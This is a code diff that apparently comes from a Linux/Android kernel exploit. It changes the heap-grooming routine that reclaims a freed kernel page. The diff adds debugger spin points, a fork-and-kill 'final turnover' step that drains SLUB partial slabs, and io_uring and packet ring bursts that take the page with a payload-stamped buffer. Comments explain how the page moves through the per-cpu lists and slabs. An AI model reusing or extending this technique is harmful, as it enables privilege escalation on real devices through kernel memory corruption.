@@ -961,7 +961,7 @@ static void unmovable_pre_drain(void) {
 static int iouring_ring_reclaim(unsigned char *payload, size_t plen) {
   if (!env_flag("IOURING_RING", 1))
     return 0;
-  int n = env_int_range("IOURING_RINGS", 64, 1, 512);
+  int n = env_int_range("IOURING_RINGS", 128, 1, 1024);
   int ok = 0;
   for (int i = 0; i < n; i++) {
     if (!iouring_ring_reclaim_one(payload, plen, 1))
@@ -1014,6 +1014,16 @@ static int packet_ring_reclaim(unsigned char *payload, size_t plen) {
     }
   }
   return ok;
+}
+
+/* RSP_HALT=1: spin here so the debugger can breakpoint this exact
+ * moment (after the closes, before the rings) and read SLUB/buddy state
+ * for the leaked base page. */
+__attribute__((noinline)) void rsp_halt_after_closes(void) {
+  volatile int spin = 1;
+  while (spin) {
+    sched_yield();
+  }
 }
 
 void prepare_ctxs(void) {
@@ -1873,8 +1883,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   slab_state_snap("after_closes");
-  packet_ring_reclaim(skb_buf, 0x500);
-  iouring_ring_reclaim(skb_buf, 0x500);
+  if (env_flag("RSP_HALT", 0)) {
+    pr_info("RSP_HALT: halting after closes\n");
+    rsp_halt_after_closes();
+  }
+  /*
+   * IMMEDIATE PCP claim (the fix): at the close moment base's page sits
+   * on the per-cpu ORDER-2 PCP LIST (QEMU struct-page read: flags=0, no
+   * PG_buddy, lru linked to neighbour pages) - the Android high-order
+   * PCP backport catches every order-2 free BEFORE the buddy. io_uring
+   * rings claim from the same PCP, so a TIGHT back-to-back payload-
+   * stamped ring burst right here (no sleeps, nothing between) takes
+   * base while it is still on the PCP. Packet rings (QEMU/caps) after.
+   */
+  /* rings moved to the END: base's page is STILL SLUB-frozen at the
+   * closes (QEMU chain walk: self-linked lru) — it only discards after
+   * the late frees below. Claim AFTER everything is freed. */
 
   int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
   pid_t *churn_pids = NULL;
@@ -1928,6 +1952,53 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       kill_child(prepare_ctx.childs[i]);
     }
   }
+  sched_yield();
+  sched_yield();
+
+  /*
+   * FINAL TURNOVER (the missing piece): even after all closes/kills,
+   * base's page survives as a stuck SLUB partial (QEMU before_rings:
+   * self-linked lru, slabs=10 remain: cpu_partial=3 + node=5 + active).
+   * Frozen partials never discard on their own. Fork enough holders to
+   * consume EVERY free object on EVERY surviving partial slab (incl.
+   * base's page — allocations from cpu-partial pages are served), then
+   * kill them all: the pages empty and discard. Rings follow.
+   */
+  {
+    int waves = env_int_range("FINAL_TURNOVER", 224, 0, 1024);
+    if (waves > 0) {
+      pid_t *tids = calloc((size_t)waves, sizeof(pid_t));
+      int n = 0;
+      for (int i = 0; i < waves; i++) {
+        tids[i] = clone_child();
+        if (tids[i] > 0)
+          n++;
+      }
+      for (int i = 0; i < n; i++) {
+        kill_child(tids[i]);
+      }
+      free(tids);
+      sched_yield();
+      sched_yield();
+      pr_info("FINAL_TURNOVER: %d holders cycled\n", n);
+    }
+  }
+
+  /*
+   * RINGS LAST (the restructure): every mm reference is now closed and
+   * every holder killed — base's page has discarded (late path) and sits
+   * at/near the head of the freshest order-2 frees. The immediate tight
+   * io_uring burst claims it while nothing else intervenes; packet rings
+   * follow (QEMU/caps), then the caller's skb sends are already done —
+   * they run before this point but only as backup.
+   */
+  slab_state_snap("before_rings");
+  if (env_flag("RSP_HALT2", 0)) {
+    pr_info("RSP_HALT2: halting before rings\n");
+    rsp_halt_after_closes();
+  }
+  iouring_ring_reclaim(skb_buf, 0x500);
+  packet_ring_reclaim(skb_buf, 0x500);
 
   return base;
 }
